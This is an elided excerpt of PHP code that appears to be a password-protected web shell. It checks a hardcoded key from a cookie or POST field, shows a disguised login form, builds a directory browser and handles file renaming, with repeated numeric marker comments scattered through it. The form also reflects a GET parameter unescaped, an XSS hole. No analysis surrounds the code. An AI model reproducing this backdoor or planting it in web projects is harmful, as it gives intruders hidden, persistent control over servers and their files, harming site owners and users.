...
$auth_key = "ecb831ffbeb5a0824527b09ecbe2a187";
...
$pass = false;
if (isset($_COOKIE['pw_name_21721'])) {
    if(($_COOKIE['pw_name_21721']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_21721'])) {
        if(($_POST['pw_name_21721']) == $auth_key) {
            setcookie("pw_name_21721", $_POST['pw_name_21721']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_21721' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726717413682942 1726717413402428 1726717413943817 1726717413509533
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726717413682942 1726717413402428 1726717413943817 1726717413509533
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726717413682942 1726717413402428 1726717413943817 1726717413509533
            $name = PATH . "/" . $_GET['r'];
